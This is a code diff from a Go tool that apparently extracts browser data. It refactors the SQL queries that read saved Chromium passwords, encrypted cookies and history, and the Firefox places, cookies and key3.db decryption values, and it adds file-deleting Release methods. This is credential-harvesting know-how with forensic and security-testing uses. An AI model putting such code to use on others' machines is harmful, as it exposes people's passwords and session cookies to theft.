@@ -5,6 +5,7 @@ import (
 	"database/sql"
 	"encoding/base64"
 	"io/ioutil"
+	"os"
 	"sort"
 	"time"
 
@@ -26,6 +27,18 @@ const (
 	FirefoxLoginData = "logins.json"
 	FirefoxData      = "places.sqlite"
 	FirefoxKey3DB    = "key3.db"
+)
+
+var (
+	queryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
+	queryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
+	queryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
+	queryFirefoxHistory   = `SELECT id, url, title, last_visit_date, visit_count FROM moz_places`
+	queryFirefoxBookMarks = `SELECT id, fk, type, dateAdded, title FROM moz_bookmarks`
+	queryFirefoxCookie    = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
+	queryMetaData         = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
+	queryNssPrivate       = `SELECT a11, a102 from nssPrivate`
+	closeJournalMode      = `PRAGMA journal_mode=off`
 )
 
 type (
@@ -124,8 +137,7 @@ func (l *Logins) ChromeParse(key []byte) error {
 		}
 	}()
 	err = loginDB.Ping()
-	var queryLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`
-	rows, err := loginDB.Query(queryLogin)
+	rows, err := loginDB.Query(queryChromiumLogin)
 	defer func() {
 		if err := rows.Close(); err != nil {
 			log.Debug(err)
@@ -196,8 +208,7 @@ func (h *History) ChromeParse(key []byte) error {
 		}
 	}()
 	err = historyDB.Ping()
-	var queryHistory = `SELECT url, title, visit_count, last_visit_time FROM urls`
-	rows, err := historyDB.Query(queryHistory)
+	rows, err := historyDB.Query(queryChromiumHistory)
 	defer func() {
 		if err := rows.Close(); err != nil {
 			log.Debug(err)
@@ -238,8 +249,7 @@ func (c *Cookies) ChromeParse(secretKey []byte) error {
 		}
 	}()
 	err = cookieDB.Ping()
-	var queryCookie = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
-	rows, err := cookieDB.Query(queryCookie)
+	rows, err := cookieDB.Query(queryChromiumCookie)
 	defer func() {
 		if err := rows.Close(); err != nil {
 			log.Debug(err)
@@ -283,8 +293,6 @@ func (c *Cookies) ChromeParse(secretKey []byte) error {
 }
 
 func (h *History) FirefoxParse() error {
-	var queryFirefoxHistory = `SELECT id, url, title, last_visit_date, visit_count FROM moz_places`
-	var closeJournalMode = `PRAGMA journal_mode=off`
 	var (
 		err         error
 		keyDB       *sql.DB
@@ -335,8 +343,6 @@ func (h *History) FirefoxParse() error {
 }
 
 func (b *Bookmarks) FirefoxParse() error {
-	var queryFirefoxBookMarks = `SELECT id, fk, type, dateAdded, title FROM moz_bookmarks`
-	var closeJournalMode = `PRAGMA journal_mode=off`
 	var (
 		err          error
 		keyDB        *sql.DB
@@ -379,7 +385,20 @@ func (b *Bookmarks) FirefoxParse() error {
 	return nil
 }
 
-var queryFirefoxCookie = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
+func (b *Bookmarks) Release(filename string) error {
+	return os.Remove(filename)
+}
+func (c *Cookies) Release(filename string) error {
+	return os.Remove(filename)
+}
+
+func (h *History) Release(filename string) error {
+	return os.Remove(filename)
+}
+
+func (l *Logins) Release(filename string) error {
+	return os.Remove(filename)
+}
 
 func (c *Cookies) FirefoxParse() error {
 	cookie := cookies{}
@@ -514,10 +533,9 @@ func getDecryptKey() (item1, item2, a11, a102 []byte, err error) {
 			log.Error(err)
 		}
 	}()
-	var queryPassword = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
-	var queryNssPrivate = `SELECT a11, a102 from nssPrivate`
+
 	err = keyDB.Ping()
-	pwdRows, err = keyDB.Query(queryPassword)
+	pwdRows, err = keyDB.Query(queryMetaData)
 	defer func() {
 		if err := pwdRows.Close(); err != nil {
 			log.Debug(err)
@@ -601,4 +619,5 @@ type Formatter interface {
 	FirefoxParse() error
 	OutPutJson(browser, dir string) error
 	OutPutCsv(browser, dir string) error
+	Release(filename string) error
 }
